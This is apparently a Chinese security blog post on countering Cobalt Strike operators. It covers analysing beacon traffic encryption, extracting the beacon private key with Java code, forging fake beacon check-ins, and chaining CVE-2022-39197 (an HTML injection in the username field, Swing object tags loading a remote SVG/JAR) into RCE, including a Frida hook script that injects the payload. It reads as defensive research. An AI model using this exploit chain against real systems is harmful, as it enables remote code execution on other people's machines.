> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkwOTE3MzAxOA==&mid=2247485724&idx=1&sn=78443e46894a904a053cbdf53fa1fe02

#  Cobaltstrike反制浅析——从伪装上线到RCE  
原创 菜鸡Y4ph3tS  魔影安全实验室   2025-06-29 14:19  
  
![](https://mmbiz.qpic.cn/mmbiz_png/4CWec3iaVibzd59VXbFYsDHgyZTL6t4Pt1GGOKpxsyceOc4WwnMlRuc9YicZOcpibWBL0Q6AW8cZYA8sicsQ1RqxwWw/640 "")  
  
本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法及商业用途，否则由此所产生的一切法律后果自负！  
  
听说马上要某行动了，最近事情有点多就很久没发文章了，  
文章不是一个时间段写的（主要内容都是好多年前写的，用的版本比较旧，现在整理笔记时重新修改，有一部分代码截图分析用的新版本，看核心逻辑就行，内容是一样的就懒得找老版本了），截图使用的版本有些乱（反正都是受漏洞影响的版本），因为现在准备发的时候发现之前的图有点问题，重新复现或者分析截一下，反正原理是一样的，核心没有变，不要在意细节。  
  
虽然CS已经更到4.10了，但是仍然有很多人还在用老版本（可能是因为破解版没拿到，或者用的大佬二开的旧版本，新版本二开的没人分享），所以在实际蓝队防守和溯源反制的过程中，这篇文章还是可以参考一下的。本文主要是从防守角度出发，列出一部分CS分析的方法和反制的手段。  
  
CS流量分析  
  
通过CS上线，抓包并筛选HTTP流量  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FxPRoZZhP0P5ebXR1mbKrgFicct1JJtJpicCMevFqQUFoiaWepofAmlBrw/640?wx_fmt=other&from=appmsg "")  
  
定位到上线的包，里面包含cookie，cookie即为加密字段  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1F9O9cF4cibpg45OEHcp7SydVWUvmqWPL2d9daAAf1icg9QGNQfYY35cbw/640?wx_fmt=other&from=appmsg "")  
  
分析逆向后的CobaltStrike源码，定位到BeaconHTTP类中的Beacon Entry  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1F79nd3tlXVtNVpHkthAxqp5mKMVNdQkricVIQKLfV4uTxtK6cDd1JnfA/640?wx_fmt=other&from=appmsg "")  
  
继续跟进到C2Beacon类，BeaconEntry入口点在此处进行定义  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FbQyhLT6zLAVicl8FBfMIkvibCCDOStaibchRg92VgL3cRoCicOr1R5uzaw/640?wx_fmt=other&from=appmsg "")  
  
继续跟进AsymmetricCrypto方法后进入AsymmetricCrypto类，其中是一个明显的RSA加密，模式为ECB，填充方式为PKCS1  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FibMTBjN3nfXZlNTdWAZPDtCoy14uraMJgZs4knCiaibgDbJSwWdU6lqDA/640?wx_fmt=other&from=appmsg "")  
  
继续往下跟到decrypt方法，RSA的解密需要调用私钥  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FzwdOcQBJCgKaYB4WHn9GNESs3icIicSYZhEicr63u8zkv1eTPrP5z55Fg/640?wx_fmt=other&from=appmsg "")  
  
回到BeaconC2类，其中对asecurity变量的赋值只有再setCrypto方法中存在  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FXRETkTib9L8c0cFh9oouut8dZEZLaaM74JUgj5C2swwBhRPDBglTm4Q/640?wx_fmt=other&from=appmsg "")  
  
使用IDEA全局搜索功能定位调用的文件，出现在BeaconSetup类中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FmvlQzvc9klXw41ZWsGw6F5Nnia3ZTYDqErrhZv0KjzcycvIhl4CJwOA/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FL1pA5zdC7jnAgtz0NW3Qyu3FEManKRAoRtGBR8uWWdM8MfIbwYgRDw/640?wx_fmt=other&from=appmsg "")  
  
继续跟传入的参var2，var2的值来自beacon_asymmetric()方法，这个方法在同个类中定义，这其中的关键就是.cobaltstrike.beacon_keys  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FmOicTFaCVlgJvlwHLI0NojKm52p6MX4bgmM8JPTJao9VqqiaRFmOz1xQ/640?wx_fmt=other&from=appmsg "")  
  
这个文件在cs运行目录下也能找到，是beacon的key文件，通常情况下通过一些工具就可以解析公钥，比如GitHub上的CobaltStrikeParser能解析默认配置下的stage信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FMMBH2dYb6OQ8Ya0Wj6FlxoQQ7199D0O7KYTZEQ70XvdicRtw4WOuxeQ/640?wx_fmt=other&from=appmsg "")  
  
要取得私钥需要通过一些方法，根据上面的代码，编写一个工具类用于提取私钥，这个代码很多人都写过，直接拿大佬写完的也行  

```
import java.io.File;
import java.util.Base64;
import common.CommonUtils;
import java.security.KeyPair;
class DumpKeys
{   
    public static void main(String[] args)
    {
        try {
            File file = new File(&#34;.cobaltstrike.beacon_keys&#34;);
            if (file.exists()) {
                KeyPair keyPair = (KeyPair)CommonUtils.readObject(file, null);
                System.out.printf(&#34;Private Key: %s\n\n&#34;, new String(Base64.getEncoder().encode(keyPair.getPrivate().getEncoded())));
                System.out.printf(&#34;Public Key: %s\n\n&#34;, new String(Base64.getEncoder().encode(keyPair.getPublic().getEncoded())));
            }
            else {
                System.out.println(&#34;Could not find .cobaltstrike.beacon_keys file&#34;);
            }
        }
        catch (Exception exception) {
           System.out.println(&#34;Could not read asymmetric keys&#34;);
        }
    }
}
```

  
使用此代码读取beacon_keys即可进行解密，运行前需设置classpath为cs的jar包文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FGOH4n4o23uBRwUXG9h3WOcAztd38pWrBomMSiaiaPiaTYQCOYYffRsaow/640?wx_fmt=other&from=appmsg "")  
  
找个在线工具，将相关字段填入可以直接解密  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FpbHr5W5j67yjKITjh8pnTLibrQXubGod5f26TWtbIORz2ntRpFAyQCw/640?wx_fmt=other&from=appmsg "")  
  
因为前面还有一串不可读字符，因此手动分析再进一步，先将私钥转换为16进制，以3082开头的即为私钥  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FXicNSDX0Nicf4Tr7juiaazj2tDgVWIqic7R5okUdeFGOHerNqSTf1d831w/640?wx_fmt=other&from=appmsg "")  
  
通过工具解析，解密得到的内容如下，似乎看起来丢了一些字符，从DESKTOP变成了SKTOP  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FrTv7Clm2knGa4MwNXniaPEePUrSY9ZQ8RluBCCf8lBAzutAjKSam3KA/640?wx_fmt=other&from=appmsg "")  
  
所以直接将16进制字符串进行解析  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FQB8GicPKG0kCym21jhtHmTHLhwxoicbN9RqYViaBKHzYOicial9FvYev4Ag/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1F70nKibJGBlsdDymtvUKx7TEmvRXJzpeoVia4egCapG5Q6o3r8OQ7hpibQ/640?wx_fmt=other&from=appmsg "")  
  
因此最终的metadata格式为：标志头（4）+Size（4）+Rawkey(16)+字体（4）+beacon ID(4)+ 进程ID（4）+port(2)+内核（4）+0x09 +受害者IP +0x09 + 主机名+ 0x09 + 用户名+0x09+进程名  
  
伪装上线  
  
因此只需要知道了公钥和linster地址就能实现伪造上线，照上面的格式构造包就行，中间还有个小坑，就是长度的问题，如果超过特定长度会报错，伪装上线效果如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FfLddxJSUPjJabIgejNqC6FZnL4c4HRRcj71ibz0BnWaNqCvAMETXHaA/640?wx_fmt=other&from=appmsg "")  
  
Tips：还有一个比较有意思的地方，正常情况下如果是Administrator上线的时候，图标是不一样的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FOlJRlJygOeOrc70mU8yPweq488knFvB3d3PfjVkyElIYjcPY8fbmsw/640?wx_fmt=other&from=appmsg "")  
  
在伪造的时候，发现上线效果不太一样，图标没变红，就是正常的蓝色，如果需要伪装成管理员（即上线时为红色图标），只要在用户名后自己加个*就行  
  
长度问题的补充  
  
最后补充一下长度问题，为什么会存在长度过长无法伪造上线呢，上面的分析已经提到了CS使用的是RSA算法，加密模式为ECB，填充方式为PKCS1  
  
RSA公钥密码体系是建立在大整数分解难题的基础上的，RSA密码体系的步骤如下：  
1. 先生成两个大素数p和q，计算n=n=p·q  
  
1. 计算φ(N)=(p-1)*(q-1)  
  
1. 选择一个整数e，1<e<φ(N)，且e与φ(N)互质  
  
1. 计算d，使得e*d=1 mod φ(N)  
  
1. 将N和e作为公钥，N和d作为私钥  
  
1. 加密数据时，将明文转换为整数M，计算C=Me mod N  
  
1. 解密数据时，将密文转换为整数C，计算M=Cd mod N  
  
在RSA算法中，公钥（N，e）用于加密数据，私钥（N，d）用于解密数据。由于φ(N)难以计算，因此在已知N和e的情况下，计算d是困难的，这就保证了RSA算法的安全性。同时，由于N是两个大素数p和q的乘积，因此破解RSA算法的关键在于分解N为p和q两个素数的乘积，这是一个极其困难的问题，因此RSA算法被认为是一种安全的加密算法。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1Fu9ZgYtVhogiczkmoNN5sMqf3UXtk36VwBBLhHdwCTtEj0QudWxEm8MA/640?wx_fmt=other&from=appmsg "")  
  
  
ECB的加密模式也很好理解，电码本模式（Electronic Codebook Book，简称ECB）是一种最直接，最简单的消息加密方式。在ECB模式中，明文加密之后将直接得到密文，同样的密文解密之后，也直接得到明文。‌ECB模式优点：  
  
简单易实现‌。每个明文块独立加密，无需复杂的链式操作或初始化向量（IV），实现逻辑简单。  
  
‌并行处理能力强‌。由于明文块独立加密，可充分利用多核处理器优势，显著提升加密/解密速度。‌‌  
  
‌无错误传播风险‌。单个明文块的错误不会影响其他块，传输过程中数据损坏时仅局部受影响。‌‌  
  
缺点‌：  
  
数据模式暴露风险‌。相同的明文块会产生相同的密文块，若明文中存在重复内容（如图片的固定模式），攻击者可轻易通过密文分析推测明文结构。‌‌  
  
‌不适合长数据流‌。对于包含大量重复数据的长数据流（如视频、连续文本），ECB模式的安全性较低，易受统计分析攻击。‌‌  
  
‌安全性较低‌。仅适用于对安全性要求极低且数据量较小的场景（如密钥保护），不适用于需要高保密性的应用。‌‌  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FYlWOEHiafEHYjPSO2kvCiaV8jY46iaojDO65GEoPvfYv7EuhCDB1TCN4w/640?wx_fmt=other&from=appmsg "")  
  
  
因为CS中使用的是RSA-1024（这是一种已知存在缺陷的加密算法，不推荐使用），也就是长度为128位，因此待加密的明文（metadata数据）是需要小于128位的，加上PKCS1占用的11位，实际可用长度是128-11=117位，因此在随机生成虚假上线的payload时，也要注意长度不能超过117，如果没有限制时纯随机可能导致长度过长，出现如下报错：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FyfpT95rznB8fEEhfKEnib6Td8ic8RAXEBwmWAK19jHHibicGHApZtyAnow/640?wx_fmt=other&from=appmsg "")  
  
RCE的前置——XSS  
  
在前不久beichen师傅给CS提了一个XSS漏洞，编号为CVE-2022-39197，影响CS<4.7.1的所有版本，用上面的伪装上线修改一下提交payload，效果如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FTZay31uEgapfXtTXrdJ2ibHbrfkvma3mMG4jO4icNficviaCDH3pL4f90A/640?wx_fmt=other&from=appmsg "")  
  
payload在用户名处，将用户名置为  

```
<html><img src=http://127.0.0.1/1.png>
```

  
即可加载  
  
但是你会发现如果把用户名替换为script标签其实并不会弹窗，直接不显示了，所以不是用file://xxx/cmd.exe这样的方式来实现的RCE  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FmgEwgsaxQ1ycdRFicHAsLKygKuaOz6xaVClMEQeyN1iaRYQAzNDAnFOw/640?wx_fmt=other&from=appmsg "")  
  
来分析一下，很多人以为直接通过js能够xss2rce，实际上并不是这样，看到很多文章都在写js的问题，但是这个核心根本不是js...（补充：后来漂亮鼠的文章里也说了），而是swing解析html的问题，先来分析一下swing的解析器，老版本的swing通常在jdk目录的rt.jar下，新的（我用的jdk21）在java.desktop/javax/swing/text/html中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1F7P8FT99RtkUpiaP6jM0P5FmD4rFQhsvFjLrcdu7hty5bPC3CXTeYURw/640?wx_fmt=other&from=appmsg "")  
  
找到解析HTML的一个方法看一下，新版本的IDEA格式解析看起来还是很友好的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FtA5aCrLia9vWSswew4PiascZOqZwdFl9tkkU3AZ9AzEFYT0vSFbmJ4Uw/640?wx_fmt=other&from=appmsg "")  
  
跟一下其中的几个Action，太菜了没发现啥，换个别的文件反而找到一点思路  
  
定位到HTMLEditorKit类中的HTMLFactory，其中定义了很多view，再一点点看，中间踩了很多坑，踩坑过程就不写了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FFnD3PZZc50B0icI4pRt09eEPYDbdFrr2T86SyOZXKkaRqnkmU6Fvazg/640?wx_fmt=other&from=appmsg "")  
  
在跟到其中的Object的时候，发现这个东西可以实例化类，还可以传递param参数，这时候感觉大概率能深入挖掘这个进行利用了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FjTSAomtBBmGAdNouJBWpHVgycDR7KeJuFabTmG4H9TGqBHJGof1jzg/640?wx_fmt=other&from=appmsg "")  
  
继续看这个类，在里面发现了createComponent，看到这个代码经常分析Java的朋友（反正不是我）应该知道这个非常经典的反射加载类代码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FIcnKwib3guAPrh4icWiaUc9jkue1Dt64S8hAFrGfZ2c96MZ66cEzcj8ibg/640?wx_fmt=other&from=appmsg "")  
  
但是条件是会先判断是否继承了Component，如果没有继承就返回错误，继续跟进SetParameter参数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FntJb4Bmu4q2nIuNeuLwm8YLhibRUlkS8R1rmnaBeLKEMk0rkib7EsjLQ/640?wx_fmt=other&from=appmsg "")  
  
这里有一个对writer的判断，也就是能不能写，如果要能写的话需要有setXXX方法的XXX属性才行，且参数为String，找Component子类可以用IDEA自带的功能去找  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FyffQJnS6qiaia74RlZGyzO9anZC60BUGZPMLSAzzreWXcOjwd6CgwKsw/640?wx_fmt=other&from=appmsg "")  
  
XSS2RCE  
  
找了半天（以下省略踩坑过程，主要是以前写的太简单了都没提）找到了org.apache.batik.swing.JSVGCanvas，可以用这个方法远程加载svg图片，svg也在xss中经常被用来绕过一些限制  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FFVbLGGvLv3SRicYxoOdWNVEf09wnKObMCeLVLpOQ7XpBqv2xZ9XR5wQ/640?wx_fmt=other&from=appmsg "")  
  
查了查文档，先简单实现一下怎么用object来加载一个标签，写一个Demo先  

```
package org.example;
import javax.swing.*;
public class Main {
    public static void main(String[] args) {
        JFrame.setDefaultLookAndFeelDecorated(true);
        JFrame frame = new JFrame(&#34;test&#34;);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        JLabel label2 = new JLabel(&#34;<html><object classid='javax.swing.JLabel'><param name='text' value='test'></object>&#34;);
        frame.getContentPane().add(label2);
        frame.pack();
        frame.setVisible(true);
    }
}
```

  
效果如下，简单实现就是加载一个JLabel  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1Fw7l7e5zXZs1ibv87I5XAia0eMKSatF1nzpScQpnsO71BEEgKOAn7Yq0A/640?wx_fmt=other&from=appmsg "")  
  
引申一下，就用上面找到的svg加载方式，使用org.apache.batik.swing.JSVGCanvas来加载svg  
  
svg代码如下：  

```
<svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;100&#34; height=&#34;100&#34;>
    <circle cx=&#34;50&#34; cy=&#34;50&#34; r=&#34;40&#34; stroke=&#34;black&#34; stroke-width=&#34;3&#34; fill=&#34;green&#34; />
</svg>
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FFicJYW7vNROySc230UEqR9Uxy7mZAs52bOp4X2ia4TW4UaxXuBWJsZibg/640?wx_fmt=other&from=appmsg "")  
  
熟悉XXE的朋友应该都知道，可以构造一个特殊的xml来执行一些命令，那试试能不能直接通过script标签来执行，结果一跑发现报错了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FxxIZuTJY6CxFDAR9OicvD05MPUFibYu1rDejEcODDECr5wDRCOrkev4A/640?wx_fmt=other&from=appmsg "")  
  
控制台里的信息显示的是找不到类，实际上在CS里直接通过这种方式利用也不行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FFdmdhVVjowGJmiblDnNXBHZ8lk9kTjRODZXQXJicEAeTGjBVvicuVXCuQ/640?wx_fmt=other&from=appmsg "")  
  
然后看文章的时候看到十年前就有人写了文章，svg和java代码执行  
  
https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html  
  
照葫芦画瓢构造恶意文件并编译成jar包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1Ff3xR2CZIem9qlvlYc2HAZqvSAECKhBkmVIqcVbibbswIbeHVzkjYDGw/640?wx_fmt=other&from=appmsg "")  
  
编译后将manifest文件加入jar包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FpGFKB5mWKBeuk6ovOib94ic6tATzTyrtSneLbJgUSxMoQibrW7icALic5CQ/640?wx_fmt=other&from=appmsg "")  
  
但是又遇到一个巨坑的问题，不知道什么情况被拦了，应该是同源策略的关系  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FGj2B7YclhBHbXVHpRrhh05VFaf3S4NyjY0nfHIjPOBbntP8qaxCfmA/640?wx_fmt=other&from=appmsg "")  
  
折腾了半天，加了一条禁用SecurityManager才解决问题（可能是不同batik版本的问题？），重新编译后即可成功启动计算器  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1F0raW5P6rzNz32HfJ1vf2FfgLywEia4djLxlmz1ICUYgnibKzPWSJicOnQ/640?wx_fmt=other&from=appmsg "")  
  
也就是通过这种方式加载SVG就能成功执行上线了，迁移到CS中来，继续回到CS分析调用情况，在CS的batik的BaseScriptingEnvironment.java中跟进解析  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FicHU2ia21lMR7uPTuaZ7FQ3krahW86UibQ7miapXZPn4GayKmBrUYVsQzg/640?wx_fmt=other&from=appmsg "")  
  
需要满足几个条件  

```
checkCompatibleScriptURL(type, purl);//条件1
man.getMainAttributes().getValue(&#34;Script-Handler&#34;)!=null //条件2
man.getMainAttributes().getValue(&#34;SVG-Handler-Class&#34;)!=null//条件3
```

  
看网上文章好像在老版本里还没有Script-Handler和SVG-Handler-Class，还是var的变量形式（笑死）。下面两个条件是特定字段不为空，第一个方法再跟一下，真是一个套一个...  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FocMrgEicXODQYrnLKC7M44ib3BTlyNNRsFQPS02nC1EbA7YkQ5mhS1hQ/640?wx_fmt=other&from=appmsg "")  
  
继续跟checkLoadScript和getScriptSecurity  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FcmKK6LJLX2OoS6cEnUfcUFsAkwSJebviaz9Yp8tdw0zGLsP6uJdSykA/640?wx_fmt=other&from=appmsg "")  
  
最终跟到了DefaultScriptSecurity  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FMjeXOXokNgticHDKzibobGCeiaDYryu127uomVkxRhSqnNcwVv6eNIuZg/640?wx_fmt=other&from=appmsg "")  
  
可以看到条件就一个，只要远程svg和jar包文件地址相同即可。  
  
长度限制的绕过  
  
上面已经说到了117的长度限制，然鹅如果使用object标签肯定长度会超，分析了一下发现了一个很有意思的东西，还是前面分析过的HTML解析部分，有一个frame标签的解析  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FQw0N84U1mPakEAWsib724kwcDmFyZX59xcAbbNpRFxA7hp67fJeDLTg/640?wx_fmt=other&from=appmsg "")  
  
使用标签方式可以绕过长度限制，但是发现出现了一堆报错  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FTD3n4HCbZceMtGpv0HqSo5ux44psRjMbEfHHg587XlRYLfkwSytbsw/640?wx_fmt=other&from=appmsg "")  
  
不知道发生了什么，又整了半天没成功，但是可以通过另一个方式去复现，就是Hook WindowsAPI，以后可能会写frida的文章吧（咕咕咕，下次一定），这次先不展开了，主要脚本如下  

```
var payload=&#34;<html><object classid='org.apache.batik.swing.JSVGCanvas'><param name='URI' value='http://127.0.0.1/test.svg'></param></object>&#34;  
    var pProcess32Next = Module.findExportByName(&#34;kernel32.dll&#34;, &#34;Process32Next&#34;)
    Interceptor.attach(pProcess32Next, {
        onEnter: function(args) {
            this.pPROCESSENTRY32 = args[1];
            if(Process.arch == &#34;ia32&#34;){
                this.exeOffset = 36;
            }else{
                this.exeOffset = 44;
            }
            this.szExeFile = this.pPROCESSENTRY32.add(this.exeOffset);
        },
        onLeave: function(retval) {
            if(this.szExeFile.readAnsiString() == &#34;beacon.exe&#34;) {
                send(&#34;[!] Found beacon, injecting payload&#34;);
                this.szExeFile.writeAnsiString(payload);
            }        
        }
    })
```

  
RCE成功，合影留念  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2sFaYicrjxornYiba8KbVHyB7m80pe9U1FFM6xZmmicJ2JG6GymicBYE8OfHesWIN1MDiba6YDLZo1pGNJhGjh1yG0w/640?wx_fmt=other&from=appmsg "")  
  
喜欢的朋友可以一键三连  
  
往期推荐  
  
  
[红队基础设施建设与改造（四）——深入解析Cobaltstrike（二开环境、认证过程分析、Beacon分析）](https://mp.weixin.qq.com/s?__biz=MzkwOTE3MzAxOA==&mid=2247485386&idx=1&sn=58bd4e0ea233075a6901ca1c18e458dc&scene=21#wechat_redirect)  
  
  
[MalleableC2配置详解](https://mp.weixin.qq.com/s?__biz=MzkwOTE3MzAxOA==&mid=2247484871&idx=1&sn=85dc63ec970621ccc35863a08e4aaade&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/qae1K3r24EZ0M9qZAia6YicddnOVklo3plxEyjBvMibxXN6KjoUsYcYIvibPwFPTRgsicpuJHMWZlRlDWkqMQcWLBsg/640?from=appmsg "")  
  
点击名片直接关注  
  
